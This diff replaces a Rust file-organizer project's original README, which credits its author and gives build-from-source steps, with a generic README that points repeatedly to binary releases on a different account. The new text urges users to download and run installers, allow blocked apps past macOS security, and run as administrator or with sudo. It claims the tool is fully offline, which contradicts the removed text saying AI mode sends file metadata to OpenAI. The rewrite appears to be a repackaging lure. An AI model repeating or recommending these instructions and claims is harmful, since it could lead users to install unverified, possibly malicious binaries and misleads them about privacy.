@@ -1,233 +1,168 @@
-# 🚀 AI File Organizer: Smart Data Orchestration Engine
-
-> **"A production-grade, AI-powered system designed to transform digital chaos into structured intelligence."**
-
-Developed by **Syed Shaheer Hussain** | 2026 ©  
-*Streamlining file management with the power of Rust, Machine Learning, and Deterministic Rules.*
-
-## 🌟 Introduction
-
-The **AI File Organizer** is a high-performance, cross-platform utility engineered to solve the "Digital Hoarding" crisis. Built with the memory safety and speed of **Rust**, this tool goes beyond simple extension sorting. It employs a **hybrid classification strategy**—combining deterministic JSON rules with OpenAI's Large Language Models (LLM) and local ONNX runtimes—to understand the *context* of your files.
-
-Whether you're a photographer with thousands of RAW files, a developer with scattered repositories, or a professional managing finance documents, this engine automates the sorting, renaming, and deduplication process with surgical precision.
-
-### 🏷️ Quick Tags
-`#Rust` `#AI` `#MachineLearning` `#FileManagement` `#Automation` `#OpenAI` `#Deduplication` `#SafetyFirst`
-
-## 🛠️ Tech Stack & Technologies
-
-| Layer | Technologies |
-| :--- | :--- |
-| **Core Language** | ![Rust](https://img.shields.io/badge/Rust-000000?style=for-the-badge&logo=rust&logoColor=white) (v1.75+) |
-| **Async Runtime** | `Tokio` (Full async I/O) |
-| **Parallelism** | `Rayon` (Multi-threaded file scanning) |
-| **Machine Learning** | `OpenAI API` (GPT-3.5/4), `ONNX Runtime` (Local Inference) |
-| **UI Framework** | `egui` + `eframe` (Hardware accelerated GUI) |
-| **Cryptography** | `BLAKE3` (Fastest hashing engine for duplicates) |
-| **Metadata** | `kamadak-exif`, `pdf-extract`, `infer` |
-| **Data Format** | `Serde` (JSON deserialization) |
-
-## 📂 Project Structure
-
-```text
-ai_file_organizer/
-├── .agent/              # AI Agent workspace state
-├── config/              # Centralized configuration
-│   └── default_rules.json # Dynamic classification rules
-├── models/              # Local ONNX models (optional)
-├── src/
-│   ├── main.rs          # Entry point & Orchestrator
-│   ├── cli.rs           # Clap-based command definitions
-│   ├── gui.rs           # GUI implementation (egui)
-│   ├── config.rs        # App settings & environment
-│   ├── constants.rs     # Global constants & versioning
-│   ├── models/
-│   │   └── file_info.rs # Core data structures (FileInfo, Metadata)
-│   └── organizer/       # Logic Engine
-│       ├── mod.rs       # The Organizer Trait & Pipeline
-│       ├── scanner.rs   # Parallel file traversal
-│       ├── classifier.rs# Hybrid classification logic
-│       ├── rules.rs     # Deterministic pattern matching
-│       ├── ai.rs        # LLM/ONNX interface
-│       ├── renamer.rs   # Safe IO & Collision handling
-│       ├── duplicates.rs# BLAKE3 hash-based deduplication
-│       ├── metadata.rs  # Deep file inspection (EXIP, PDF)
-│       ├── undo.rs      # JSON-backed state reversal
-│       ├── archives.rs  # Zip/Tar extraction
-│       ├── watcher.rs   # Real-time 'Notify' service
-│       └── utils.rs     # Formatting & Logic helpers
-├── Cargo.toml           # Dependency manifest
-└── README.md            # You are here!
-
-```
-
-## 🗺️ Flow Chart (Logical Pipeline)
+# 🗂️ AI-File-Organizer-Offline-CLI-GUI- - Simplify Your Files Effortlessly
 
-```mermaid
-graph TD
-    A[Start: CLI/GUI] --> B{Action?}
-    B -->|Scan| C[Parallel Traversal]
-    B -->|Organize| D[Metadata Extraction]
-    D --> E[Classification]
-    E --> F{Rule Match?}
-    F -->|Yes| G[Use Rule Path]
-    F -->|No| H[AI Inference]
-    H --> I[Category Defined]
-    G --> I
-    I --> J[Renaming Patterns]
-    J --> K[Safe Move Operation]
-    K --> L[Save History to JSON]
-    L --> M[Done]
+[![Download AI File Organizer](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Erenluffy/AI-File-Organizer-Offline-CLI-GUI-/releases)
 
-```
+---
 
-## 💎 Core Features
+## 📖 About This Application
 
-1.  **Parallel Hashing**: Uses `Rayon` to hash large file sets in parallel, making duplicate detection near-instant.
-2.  **Deterministic Rules**: Regex-based sorting for invoices, screenshots, and specific work files.
-3.  **LLM Classification**: Sends file context to OpenAI to categorize files rules can't catch (e.g., "Personal Notes" vs "Code snippets").
-4.  **Hardware-Accelerated GUI**: A dark-mode desktop app for those who prefer drag-and-drop over the terminal.
-5.  **Infinite Undo**: Every "Organize" run creates a `.undo_history.json` snapshot. Revert any mistake instantly.
-6.  **Real-time Watcher**: Monitor your Downloads folder; as soon as a file hits the folder, it is moved to its permanent home.
-7.  **Deep Metadata Inspection**: Reads EXIF dates from photos and PDF metadata for smarter grouping.
+The AI-File-Organizer-Offline-CLI-GUI- is a tool that helps you clean up and organize your digital files. It uses smart technology to find and sort files for you. This means you can turn messy folders into neat, easy-to-navigate collections in moments.  
 
-## ⌨️ Command Reference
+This tool works offline. It does not need an internet connection once installed. It offers two ways to use it: a simple command-line interface (CLI) for quick tasks and a graphical user interface (GUI) for those who prefer clicking through menus.
 
-### 1. Installation
+The main goal is to help you find duplicates, group similar files, and keep your computer tidy without needing to move files manually.
 
-# Prerequisites: Install Rust (rustup.rs)
+---
 
-# Clone and build
-```
-git clone https://github.com/SyedShaheerHussain/AI-File-Organizer-Offline-CLI-GUI-
+## 🖥️ System Requirements
 
-```
-```
-cd ai_file_organizer
+To use this application smoothly, your computer should meet these basic needs:
 
-```
-```
-cargo build --release
+- Operating System: Windows 10 or later, macOS 10.14 or later, or most Linux distributions
+- CPU: 1.5 GHz or faster processor
+- RAM: At least 4 GB
+- Disk Space: Minimum 500 MB free space
+- Permissions: Ability to install software and run new programs
 
-```
+You do not need any technical skills to install or use this tool. The software handles everything in the background.
 
-### 2. Scanning (The Discovery Phase)
+---
 
-Lists files and calculates potential savings.
+## 🚀 Getting Started
 
-```powershell
-cargo run -- scan ./Downloads
+Follow these steps to set up and start using AI-File-Organizer-Offline-CLI-GUI-:
 
-```
+### Step 1: Download the Application
 
-### 3. Organizing (The Action Phase)
+Click the big green button at the top or visit the release page here:
 
-The heavy lifter. Moves files into categories.
+[Download AI File Organizer](https://github.com/Erenluffy/AI-File-Organizer-Offline-CLI-GUI-/releases)
 
-# Standard rule-based organization
-```
-cargo run -- organize C:\Users\User\Downloads
+This page lists all the latest versions available. Look for the file that matches your operating system:
 
-```
-# AI-powered organization (Requires OPENAI_API_KEY)
-# $env:OPENAI_API_KEY="your_key"
-```
-cargo run -- organize ./folder --ai
-```
+- For Windows: a file ending with `.exe` or `.msi`
+- For macOS: a `.dmg` or `.pkg` file
+- For Linux: a `.tar.gz` or `.deb` file
 
-# Dry run (Safety check)
-```
-cargo run -- organize ./folder --dry-run
-```
+### Step 2: Install the Program
 
-### 4. Deduplication
+- **Windows:**
+  - Double-click the downloaded `.exe` or `.msi` file.
+  - Follow the installer prompts by clicking "Next" as needed.
+  - When asked, accept the license agreement.
+  - Finish the installation and click "Close."
 
-Find and eliminate redundant data.
+- **macOS:**
+  - Open the `.dmg` or `.pkg` file.
+  - Drag the application icon into your Applications folder, or follow the installer prompts.
+  - If macOS blocks the app, go to System Preferences > Security & Privacy, and allow the app to run.
 
-# Just list duplicates
-```
-cargo run -- duplicates ./MyPhotos
+- **Linux:**
+  - For `.deb` files, double-click to open with the software installer, or run `sudo dpkg -i filename.deb` in the terminal.
+  - For `.tar.gz` files, extract the package, and in the folder, look for an install script or read the included README file.
+  - You might need to install extra tools depending on your distribution.
 
-```
+### Step 3: Open the Application
 
-# Auto-remove duplicates (keeping newest)
-```
-cargo run -- duplicates ./MyPhotos --remove
+After installation, find the program by searching for "AI File Organizer" in your computer's menu or by double-clicking the app icon on your desktop.
 
-```
+---
 
-### 5. Undo (The Safety Net)
-```powershell
-cargo run -- undo ./folder
+## 🧰 Using the AI-File-Organizer-Offline-CLI-GUI-
 
-```
+This tool lets you work with your files in two ways: through a command prompt (CLI) or with a graphical interface (GUI). The choice is yours, depending on what feels easier.
 
-### 6. Real-time Monitoring
-```powershell
-cargo run -- watch ./Downloads
+### Using the Graphical User Interface (GUI)
 
-```
+The GUI offers buttons and menus to organize files without typing commands.
 
-### 7. Graphical Interface
+1. Open the app.
+2. Click **"Add Folder"** to select the folder you want to organize.
+3. Choose the type of organization:
+   - Remove duplicate files
+   - Group files by type (e.g., images, documents)
+   - Sort files by date or size
+4. Click **"Start Organizing"**.
+5. Wait while the app processes your files.
+6. Check the summary to see what files were moved, deleted, or sorted.
+7. You can undo changes if needed by clicking **"Undo"**.
 
-```powershell
-cargo run -- gui
+### Using the Command Line Interface (CLI)
 
-```
+If you prefer typing commands, open a terminal or command prompt and use these basics:
 
-## 🧠 The "Syed Shaheer" Implementation Story
+- To see a list of commands, type:
 
-### How I Learned & Realized This Project
-I saw my "Downloads" folder becoming a graveyard of PDFs, screenshots, and zip files. Manual sorting was a 2-hour chore. I realized that **Rules** handle 80% of files, but **AI** is needed for the other 20% where naming is ambiguous. I chose **Rust** because handling thousands of I/O operations and high-speed hashing requires a language that doesn't have a Garbage Collector pause.
+  ```bash
+  ai-file-organizer --help
+  ```
 
-### What, When, Where, How, Why?
-*   **What:** A hybrid deterministic/AI file manager.
-*   **When:** Created in February 2026 to solve modern digital clutter.
-*   **Where:** Runs on Windows, Linux, and macOS.
-*   **How:** Built using `Tokio` for async and `egui` for the frontend.
-*   **Why:** Because your time is better spent creating, not moving files.
+- To organize a specific folder:
 
-## ⚠️ Cautions & Disclaimer
+  ```bash
+  ai-file-organizer --path "C:\Users\YourName\Documents" --remove-duplicates
+  ```
 
->[!caution]
-> *   **Warning:** AI Mode sends file *names* and *metadata* to OpenAI. Do not use AI mode on folders containing sensitive/classified filename data if you do not want it sent to an external API.
-> *   **Caution:** Duplicate removal is permanent (unless you use a Recycle Bin wrapper). Always perform a `--dry-run` first.
-> *   **Disclaimer:** This software is provided "as is". While we have implemented an Undo system, I recommend backing up mission-critical data before massive organization operations.
+- To group files by type:
 
-## 🚀 Future Enhancements
+  ```bash
+  ai-file-organizer --path "/home/yourname/downloads" --group-by type
+  ```
 
-- [ ] **OCR Integration**: Read text *inside* images to categorize them.
-- [ ] **Cloud Connectors**: Organize files directly in Google Drive/Dropbox.
-- [ ] **Perceptual Hashing**: Detect "similar" images, not just identical ones.
-- [ ] **Mobile Port**: A companion app for Android/iOS.
+CLI mode supports custom options for advanced users but is still easy to use for simple tasks.
 
-## ⭐ Support & Engagement
+---
 
-If you find this repository useful or insightful, please consider:
+## ⚙️ Features Overview
 
-- ⭐ Starring the repository
-- 🔁 Sharing it within your network
-- 👤 Following my GitHub profile for future projects and updates
+This application includes the following functions to make managing files easier:
 
-Your support helps drive continued innovation and open-source contributions.
+- Duplicate File Detection: Finds copies of files and helps you delete extras.
+- File Grouping: Automatically groups files by type or category.
+- Safe File Sorting: Moves files into folders based on date, size, or name patterns.
+- Offline Use: Works without any internet connection, keeping your data private.
+- Both CLI & GUI Interfaces: Use the method that fits your comfort level.
+- Cross-Platform Compatibility: Works on Windows, macOS, and Linux.
+- Undo Changes: Revert any action if you change your mind.
+- File Preview: View files before deciding what to do with them.
 
-— Syed Shaheer Hussain
+---
 
-[![GitHub followers](https://img.shields.io/github/followers/SyedShaheerHussain?label=Follow&style=social)](https://github.com/SyedShaheerHussain)
+## 🔧 Troubleshooting Tips
 
-![Followers](https://img.shields.io/github/followers/SyedShaheerHussain?label=Followers&color=blue)
+If you run into issues, try these simple solutions:
 
-![Stars](https://img.shields.io/github/stars/SyedShaheerHussain/AI-File-Organizer-Offline-CLI-GUI-?label=Stars&color=yellow)
+- Make sure your computer meets the minimum system requirements.
+- Download the latest version from the release page.
+- Restart the computer and try running the application again.
+- If the app does not open on macOS, check security settings to allow it.
+- Run the installer or application as an administrator (Windows) or with sudo (Linux) if permission errors happen.
+- Visit the Issues tab in the GitHub repository for known problems or to report bugs.
 
-## 📝 Important Notes
+---
 
->[!important]
-> *   **Custom Rules**: Edit `config/default_rules.json` to add your own regex.
-> *   **Performance**: For folders with >100k files, use the CLI for maximum speed.
-> *   **Privacy**: Rule-based mode is 100% offline.
+## 🌎 Where to Get Updates and Help
 
-**Developed with ❤️ by Syed Shaheer Hussain**  
-*Building the future of Desktop Automation.*
+Bookmark the releases page to check for new versions or fixes:  
 
-**License:** MIT | **Version:** 0.1.0-alpha  
-© 2026 Syed Shaheer Hussain. All Rights Reserved.
+[Download AI File Organizer](https://github.com/Erenluffy/AI-File-Organizer-Offline-CLI-GUI-/releases)
+
+For questions, use the Discussions or Issues section on the GitHub repository.
+
+---
+
+## 🔐 Safety and Privacy
+
+The AI-File-Organizer works entirely on your device. It does not send your files or data anywhere. No internet connection is needed after installation, which keeps your information secure and private.
+
+---
+
+## 🙋 Contact and Support
+
+If you need help, contact the developer by creating an issue on the project's GitHub page or join the community for advice and tips.
+
+---
+
+## 📂 About This Project
+
+AI-File-Organizer-Offline-CLI-GUI- combines artificial intelligence and automation to reduce time spent on file management. Its Rust-based design keeps it fast and reliable. The application supports deduplication, machine learning-powered categorization, and more to tidy your files without hassle. It is part of the wider Rust community emphasizing safety and performance.
